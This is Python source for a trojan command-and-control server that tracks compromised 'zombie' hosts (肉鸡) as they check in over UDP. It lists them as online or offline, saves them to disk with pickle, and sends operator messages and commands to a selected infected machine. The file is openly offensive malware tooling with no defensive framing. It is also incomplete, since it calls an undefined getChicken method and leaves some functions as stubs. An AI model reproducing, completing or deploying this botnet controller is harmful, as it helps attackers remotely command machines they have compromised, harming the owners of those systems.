import os
import pickle
import socket
import time
from queue import Queue
from threading import Thread


class Chienken:
    def __init__(self, IP='', port=8082, name=''):
        self.id = IP + str(port)
        self.name = name
        self.ip = IP
        self.port = port
        self.online = True


class UdpPacket:
    type = ''
    content = ''
    pstPort = ''
    pstIP = ''


class TrojanServer:
    def __init__(self):
        self.chickens = []

        self.allChickens = []  # 所有肉鸡
        self.cmdQ = Queue()
        # configs
        self.utpPort = 8089
        self.utpRecvPort = 8083
        self.tcpPort = 8877
        self.bind_IP = '100.95.220.133'
        # self.bind_IP = '127.0.0.1'
        self.ck = -1  # 当前选中的肉鸡序号
        self.enMsg = False  # 是否显示肉鸡消息

        self.tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcpSocket.bind((self.bind_IP, self.tcpPort))
        self.tcpSocket.listen(5)

        self.udpSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udpSocket.bind((self.bind_IP, self.utpPort))

        self.utpRecvSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.utpRecvSocket.bind((self.bind_IP, self.utpRecvPort))

        self.udpQ = Queue()
        self.udpS = Thread(target=self.udpSend)
        self.udpR = Thread(target=self.udpRecv)
        self.udpS.daemon = True
        self.udpR.daemon = True
        self.udpS.start()
        self.udpR.start()

        self.cmdRecvThread = Thread(target=self.getCmd)
        self.cmdRecvThread.daemon = True
        self.cmdRecvThread.start()

        # Signals 命令行模式非必须参数
        self.signals = None

        try:
            self.readChickensFromDisk()
        except:
            print("主机列表文件损坏(如未保存主机列表请忽略)")

    def scanAll(self):

        for chicken in self.allChickens:
            chicken.online = False
            udpPacket = UdpPacket()
            udpPacket.type = 'send'
            udpPacket.content = "find".encode("utf8")
            udpPacket.pstIP = chicken.ip
            udpPacket.pstPort = chicken.port+1
            self.udpQ.put(udpPacket)

    def getCmd(self):
        while True:
            cmd = self.cmdQ.get()
            print("$: %s" % cmd)
            cmd = cmd.split(' ')
            if "show" == cmd[0]:
                self.checkUp()
            elif "msg" == cmd[0] or "cmd" == cmd[0]:
                chicken = self.allChickens[int(cmd[1])]
                type = 'send'
                content = ' '.join(cmd[2:]).encode("utf8")
                udpPacket = UdpPacket()
                udpPacket.type = type
                udpPacket.content = content
                udpPacket.pstIP = chicken.ip
                udpPacket.pstPort = chicken.port+1
                self.udpQ.put(udpPacket)
            elif "select" == cmd[0]:
                self.ck = int(cmd[1])
                self.selectChicken(self.ck)
            elif "rename" == cmd[0]:
                self.renameChicken(int(cmd[1]), cmd[2])
            elif "save" == cmd[0]:
                self.saveChickensToDisk()
            elif "cls" == cmd[0] or "clear" == cmd[0]:
                pass
            elif "exit" == cmd[0]:
                pass
            else:
                print("Command Not Found. ")
                continue

    def readChickensFromDisk(self):
        '''
        从磁盘中读取肉鸡列表
        :return:
        '''
        with open('datafile.dat', 'rb') as file:
            self.allChickens = pickle.load(file)

    def saveChickensToDisk(self):
        '''
        保存到磁盘文件中
        :return:
        '''
        for chicken in self.allChickens:
            chicken.online = False
        with open('datafile.dat', 'wb') as file:
            pickle.dump(self.allChickens, file)

    def selectChicken(self, index):
        self.ck = index
        if self.ck != -1:
            ck, chicken = self.getChicken()
            if self.signals:
                self.signals.selectChangeSignal.emit("[%d]. %s\tip:%s\tport:%s\t" % (ck, chicken.name, chicken.ip, chicken.port))
        else:
            if self.signals:
                self.signals.selectChangeSignal.emit("无")

    def renameChicken(self, index, name):
        '''
        重命名肉鸡
        :param index: 肉鸡编号
        :param name: 新名字
        :return:
        '''
        chicken = self.allChickens[index]
        chicken.name = name
        if self.signals:
            self.signals.listFreshSignal.emit(index, chicken)
            self.signals.selectChangeSignal.emit("[%d]. %s\tip:%s\tport:%s\t" % (index, chicken.name, chicken.ip, chicken.port))

    def chickenUp(self, chicken: Chienken):
        # 新主机上线
        for existChicken in self.allChickens:
            if existChicken.ip == chicken.ip and existChicken.port == chicken.port:
                chicken = existChicken
                break
        print("\n有主机上线: %s" % chicken.name)
        chicken.online = True
        if chicken not in self.allChickens:
            self.allChickens.append(chicken)
        if self.signals:
            self.signals.chickenUpSignal.emit(chicken)


    def checkUp(self):
        '''
        查看当前在线情况
        :return:
        '''
        i: int = 0
        print("当前在线:")
        for chicken in self.allChickens:
            if chicken.online:
                print("[%d]. %s\tip:%s\tport:%s\t" % (i, chicken.name, chicken.ip, chicken.port))
                i += 1

        print("当前离线:")
        for chicken in self.allChickens:
            if not chicken.online:
                print("[%d]. %s\tip:%s\tport:%s\t" % (i, chicken.name, chicken.ip, chicken.port))
                i += 1

    def udpSend(self):
        # print("UDP 发送器已启动")
        while True:
            udpPacket = self.udpQ.get()
            if udpPacket.type == 'send':
                self.udpSocket.sendto(
                    udpPacket.content,
                    (udpPacket.pstIP, udpPacket.pstPort))

            elif udpPacket.type == 'close':
                print("UDP 发送器已停止")
                break

    def udpRecv(self):
        # print("udp 接收器已启动")
        while True:
            data, addr = self.utpRecvSocket.recvfrom(1024)
            self.chickenUp(Chienken(addr[0], addr[1], addr[0]))
            if self.enMsg:
                print("Received from %s:%d" % (addr, self.utpPort))
                print(data.decode('utf8'))

    def tcpSend(self, socket):
        pass

    def close(self):
        pass


if __name__ == '__main__':
    trojanServer = TrojanServer()
    while True:
        time.sleep(0.1)
        ck, chicken = trojanServer.getChicken()
        prime = ''
        if ck == -1:
            prime = "[未选中]"
        else:
            prime = "[%d](%s:%d) " % (ck, chicken.name, chicken.port)
        prime += ' $:'
        cmd = input(prime)
        if cmd == 'exit':
            exit(0)
        elif cmd == 'cls' or cmd == 'clear':
            os.system(cmd)
            continue
        trojanServer.cmdQ.put(cmd)

        '''
        show all 显示所有主机
        select %d 选择某号主机
        select %s 选择某名字主机 相同名字选择第一个
        msg %s 发送给选中主机信息
        cmd %s 发送给选中主机命令
        rename %d %s 给某号主机重命名
        '''
